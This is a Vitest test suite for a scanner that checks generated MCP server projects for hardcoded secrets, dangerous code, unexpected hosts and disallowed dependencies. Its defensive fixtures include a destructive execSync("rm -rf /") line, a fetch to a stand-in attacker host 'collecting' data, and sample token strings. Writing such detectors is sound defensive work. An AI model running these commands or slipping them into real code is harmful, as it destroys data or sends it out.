import { describe, expect, it } from "vitest";
import { generateProject } from "@unumcp/codegen";
import type { GenerateOptions } from "@unumcp/codegen";
import { scanGeneratedProject, summarizeScan } from "../src/scan";
import type { ScanFile } from "../src/scan";

function file(path: string, content: string): ScanFile {
  return { path, content };
}

describe("scanGeneratedProject — secrets", () => {
  it("flags an embedded private key", () => {
    const r = scanGeneratedProject([
      file("src/x.ts", "const k = `-----BEGIN RSA PRIVATE KEY-----`;"),
    ]);
    expect(r.passed).toBe(false);
    expect(r.findings[0]).toMatchObject({ rule: "hardcoded-secret", severity: "high", line: 1 });
  });

  it("flags AWS / GitHub / Slack / sk- / Google tokens", () => {
    const samples = [
      "AKIAIOSFODNN7EXAMPLE",
      "ghp_0123456789abcdefghijklmnopqrstuvwxyz",
      "xoxb-1234567890-abcdefghij",
      "sk-abcdefghijklmnopqrstuvwxyz0123",
      "AIzaSyA1234567890abcdefghijklmnopqrstuv",
    ];
    for (const token of samples) {
      const r = scanGeneratedProject([file("src/x.ts", `const t = "${token}";`)]);
      expect(r.passed, token).toBe(false);
      expect(r.findings.some((f) => f.rule === "hardcoded-secret")).toBe(true);
    }
  });

  it("flags a credential assigned to a literal but redacts the value", () => {
    const r = scanGeneratedProject([file("src/x.ts", 'const password = "hunter2hunter2";')]);
    expect(r.passed).toBe(false);
    const finding = r.findings.find((f) => f.rule === "hardcoded-secret");
    expect(finding?.excerpt).not.toContain("hunter2hunter2");
    expect(finding?.excerpt).toContain("***");
  });

  it("does not flag env-backed or placeholder credentials", () => {
    const r = scanGeneratedProject([
      file("src/env.ts", "apiKey: process.env.API_KEY,"),
      file(".env.example", "API_KEY=your_token_here"),
      file("src/c.ts", 'const apiKey = "process.env.TOKEN";'),
    ]);
    expect(r.passed).toBe(true);
    expect(r.findings).toHaveLength(0);
  });
});

describe("scanGeneratedProject — dangerous code", () => {
  it("flags eval, new Function, child_process, spawn", () => {
    const cases = [
      "eval(userInput)",
      "const f = new Function('return 1')",
      'import cp from "child_process"',
      'execSync("rm -rf /")',
    ];
    for (const code of cases) {
      const r = scanGeneratedProject([file("src/x.ts", code)]);
      expect(r.passed, code).toBe(false);
    }
  });

  it("flags obfuscation as medium (non-blocking on its own)", () => {
    const r = scanGeneratedProject([
      file("src/x.ts", "const d = atob('ZXZpbA==');"),
    ]);
    expect(r.findings.some((f) => f.rule === "obfuscation" && f.severity === "medium")).toBe(true);
    // medium alone still passes the gate
    expect(r.passed).toBe(true);
  });
});

describe("scanGeneratedProject — hosts", () => {
  it("flags an unexpected exfiltration host", () => {
    const r = scanGeneratedProject(
      [file("src/x.ts", 'fetch("https://evil.example-attacker.com/collect")')],
      { allowedHosts: ["api.github.com"] },
    );
    expect(r.passed).toBe(false);
    expect(r.findings[0]).toMatchObject({ rule: "unexpected-host" });
    expect(r.findings[0]?.message).toContain("evil.example-attacker.com");
  });

  it("allows the configured host, reserved example domains, and localhost", () => {
    const r = scanGeneratedProject(
      [
        file("a.ts", 'const u = "https://api.github.com/repos";'),
        file("b.ts", 'const u = "https://example.test/x";'),
        file("c.ts", 'const u = "https://api.example.com/x";'),
        file("d.ts", 'const u = "http://localhost:3000/x";'),
      ],
      { allowedHosts: ["api.github.com"] },
    );
    expect(r.passed).toBe(true);
    expect(r.findings).toHaveLength(0);
  });

  it("ignores port and userinfo when matching the host", () => {
    const r = scanGeneratedProject([file("a.ts", '"https://api.github.com:443/x"')], {
      allowedHosts: ["api.github.com"],
    });
    expect(r.passed).toBe(true);
  });
});

describe("scanGeneratedProject — dependency allowlist (§16.4)", () => {
  const pkg = (deps: Record<string, string>, dev: Record<string, string> = {}) =>
    file("package.json", JSON.stringify({ name: "x", dependencies: deps, devDependencies: dev }, null, 2));

  it("passes when every dependency is on the allowlist", () => {
    const r = scanGeneratedProject([
      pkg({ "@modelcontextprotocol/sdk": "1.29.0", zod: "^3.25.0" }, { vitest: "^2.1.0", typescript: "^5.6.0" }),
    ]);
    expect(r.passed).toBe(true);
    expect(r.findings).toHaveLength(0);
  });

  it("flags a dependency outside the allowlist", () => {
    const r = scanGeneratedProject([pkg({ zod: "^3.25.0", "left-pad": "^1.3.0" })]);
    expect(r.passed).toBe(false);
    const finding = r.findings.find((f) => f.rule === "disallowed-dependency");
    expect(finding?.message).toContain("left-pad");
    expect(finding?.line).toBeGreaterThan(1);
  });

  it("flags disallowed devDependencies too", () => {
    const r = scanGeneratedProject([pkg({ zod: "^3.25.0" }, { "evil-postinstall": "*" })]);
    expect(r.passed).toBe(false);
    expect(r.findings.some((f) => f.rule === "disallowed-dependency")).toBe(true);
  });

  it("honors a caller-supplied allowlist", () => {
    const r = scanGeneratedProject([pkg({ "my-lib": "1.0.0" })], { allowedDependencies: ["my-lib"] });
    expect(r.passed).toBe(true);
  });

  it("ignores a malformed package.json (generation bug, not a security finding)", () => {
    const r = scanGeneratedProject([file("package.json", "{ not valid json ")]);
    expect(r.findings.some((f) => f.rule === "disallowed-dependency")).toBe(false);
  });
});

describe("summarizeScan", () => {
  it("reports clean and counts", () => {
    expect(summarizeScan({ passed: true, findings: [] })).toContain("clean");
    const summary = summarizeScan({
      passed: false,
      findings: [
        { rule: "x", severity: "high", path: "a", line: 1, message: "", excerpt: "" },
        { rule: "y", severity: "medium", path: "a", line: 2, message: "", excerpt: "" },
      ],
    });
    expect(summary).toContain("1 high");
    expect(summary).toContain("1 medium");
  });
});

describe("scanGeneratedProject — real generated output has no false positives", () => {
  const options: GenerateOptions = {
    serverName: "github-mcp-server",
    displayName: "GitHub MCP Server",
    baseUrl: "https://api.github.com",
    auth: { type: "bearer", envVar: "GITHUB_TOKEN" },
    tools: [
      {
        name: "create_issue",
        description: "Create an issue in a repository.",
        method: "post",
        pathTemplate: "/repos/{owner}/{repo}/issues",
        parameters: [
          { name: "owner", in: "path" },
          { name: "repo", in: "path" },
        ],
        hasBody: true,
        authRequired: true,
        riskLevel: "medium",
        inputSchema: {
          type: "object",
          properties: {
            owner: { type: "string" },
            repo: { type: "string" },
            body: { type: "object", properties: { title: { type: "string" } } },
          },
          required: ["owner", "repo"],
        },
      },
    ],
  };

  it("passes a clean scan over a freshly generated project", () => {
    const files = generateProject(options).map((f) => ({ path: f.path, content: f.content }));
    const result = scanGeneratedProject(files, { allowedHosts: ["api.github.com"] });
    if (!result.passed) {
      // Surface what tripped so a regression is obvious.
      throw new Error(
        "real output failed scan:\n" +
          result.findings.map((f) => `  ${f.path}:${f.line} ${f.rule} — ${f.excerpt}`).join("\n"),
      );
    }
    expect(result.passed).toBe(true);
    expect(result.findings.filter((f) => f.severity === "high")).toHaveLength(0);
  });
});
